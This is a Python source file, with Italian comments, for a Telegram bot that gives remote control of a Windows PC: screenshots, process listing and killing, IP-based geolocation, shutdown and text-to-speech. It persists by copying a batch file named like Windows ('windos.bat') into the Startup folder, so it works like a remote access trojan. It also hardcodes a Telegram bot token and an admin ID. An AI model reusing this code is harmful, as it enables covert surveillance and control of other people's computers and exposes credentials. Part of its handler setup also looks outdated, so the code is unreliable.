import os
import sys
import shutil
import subprocess
import psutil
import pyautogui
import requests
import pyttsx3
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

# Inserisci il tuo TOKEN API di Telegram
TOKEN = "7895216596:AAHkQdNkg5XrCElVjXvfnVfkKKk8DFB_yYE"

# ID Telegram autorizzati (il tuo ID personale)
ADMIN_ID = [1108744122]

# Percorsi dei file
BAT_FILE = "C:\\ProgramData\\windos\\windos.bat"
STARTUP_FOLDER = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")

# Controlla se le librerie necessarie sono installate e installale se necessario
REQUIRED_MODULES = ["telegram", "psutil", "pyautogui", "requests", "pyttsx3"]

def install_missing_modules():
    for module in REQUIRED_MODULES:
        try:
            __import__(module)
        except ImportError:
            print(f"[⚠] Modulo '{module}' non trovato. Installazione in corso...")
            subprocess.run([sys.executable, "-m", "pip", "install", module, "--upgrade"])
    print("[✔] Tutti i moduli sono installati!")

install_missing_modules()

# Configura l'avvio automatico del bot
def setup_autostart():
    destination = os.path.join(STARTUP_FOLDER, "windos.bat")
    if not os.path.exists(destination):
        shutil.copy(BAT_FILE, destination)
        print("[✔] File bat copiato nella cartella di avvio.")

async def start(update: Update, context: CallbackContext) -> None:
    await update.message.reply_text("🔹 Il bot è attivo! Usa /spegni, /riavvia, /annulla, /stato, /screenshot, /programmi, /chiudi nome.exe, /posizione o /parla messaggio.")

async def spegni(update: Update, context: CallbackContext) -> None:
    if update.message.chat_id in ADMIN_ID:
        await update.message.reply_text("🛑 Spegnimento in corso...")
        os.system("shutdown /s /t 5")
    else:
        await update.message.reply_text("❌ Accesso negato!")

async def riavvia(update: Update, context: CallbackContext) -> None:
    if update.message.chat_id in ADMIN_ID:
        await update.message.reply_text("🔄 Riavvio in corso...")
        os.system("shutdown /r /t 5")
    else:
        await update.message.reply_text("❌ Accesso negato!")

async def annulla(update: Update, context: CallbackContext) -> None:
    if update.message.chat_id in ADMIN_ID:
        await update.message.reply_text("⛔ Spegnimento annullato!")
        os.system("shutdown /a")
    else:
        await update.message.reply_text("❌ Accesso negato!")

async def stato_pc(update: Update, context: CallbackContext) -> None:
    if update.message.chat_id in ADMIN_ID:
        cpu = psutil.cpu_percent()
        ram = psutil.virtual_memory().percent
        battery = psutil.sensors_battery().percent if psutil.sensors_battery() else "N/D"
        response = f"💻 **Stato del PC**\n🔹 CPU: {cpu}%\n🔹 RAM: {ram}%\n🔹 Batteria: {battery}%"
        await update.message.reply_text(response)
    else:
        await update.message.reply_text("❌ Accesso negato!")

async def screenshot(update: Update, context: CallbackContext) -> None:
    if update.message.chat_id in ADMIN_ID:
        screenshot_path = "C:\\ProgramData\\windos\\screenshot.png"
        pyautogui.screenshot().save(screenshot_path)
        await update.message.reply_photo(photo=open(screenshot_path, "rb"))
    else:
        await update.message.reply_text("❌ Accesso negato!")

async def lista_programmi(update: Update, context: CallbackContext) -> None:
    if update.message.chat_id in ADMIN_ID:
        processi = [p.info['name'] for p in psutil.process_iter(['name']) if p.info['name']]
        await update.message.reply_text("🖥 **Programmi Attivi:**\n" + "\n".join(processi))
    else:
        await update.message.reply_text("❌ Accesso negato!")

async def chiudi_programma(update: Update, context: CallbackContext) -> None:
    if update.message.chat_id in ADMIN_ID and context.args:
        nome_programma = context.args[0]
        for proc in psutil.process_iter():
            if proc.name().lower() == nome_programma.lower():
                proc.terminate()
                await update.message.reply_text(f"✅ Programma `{nome_programma}` chiuso con successo.")
                return
        await update.message.reply_text(f"⚠ Programma `{nome_programma}` non trovato.")
    else:
        await update.message.reply_text("❌ Specifica un programma! Esempio: `/chiudi chrome.exe`")

async def posizione(update: Update, context: CallbackContext) -> None:
    if update.message.chat_id in ADMIN_ID:
        try:
            data = requests.get("http://ip-api.com/json/").json()
            await update.message.reply_text(f"📍 **Posizione del PC**\n🔹 Città: {data['city']}\n🔹 Regione: {data['regionName']}\n🔹 Paese: {data['country']}\n🔹 IP: {data['query']}")
        except:
            await update.message.reply_text("❌ Errore nel recupero della posizione!")
    else:
        await update.message.reply_text("❌ Accesso negato!")

async def parla(update: Update, context: CallbackContext) -> None:
    if update.message.chat_id in ADMIN_ID and context.args:
        testo = " ".join(context.args)
        engine = pyttsx3.init()
        engine.say(testo)
        engine.runAndWait()
        await update.message.reply_text("🗣 Il PC ha detto: " + testo)
    else:
        await update.message.reply_text("❌ Specifica un messaggio! Esempio: `/parla Ciao!`")

def main():
    setup_autostart()
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("spegni", spegni))
    app.add_handler(CommandHandler("riavvia", riavvia))
    app.add_handler(CommandHandler("annulla", annulla))
    app.add_handler(CommandHandler("stato", stato_pc))
    app.add_handler(CommandHandler("screenshot", screenshot))
    app.add_handler(CommandHandler("programmi", lista_programmi))
    app.add_handler(CommandHandler("chiudi", chiudi_programma, pass_args=True))
    app.add_handler(CommandHandler("posizione", posizione))
    app.add_handler(CommandHandler("parla", parla, pass_args=True))
    app.run_polling()

if __name__ == "__main__":
    main()
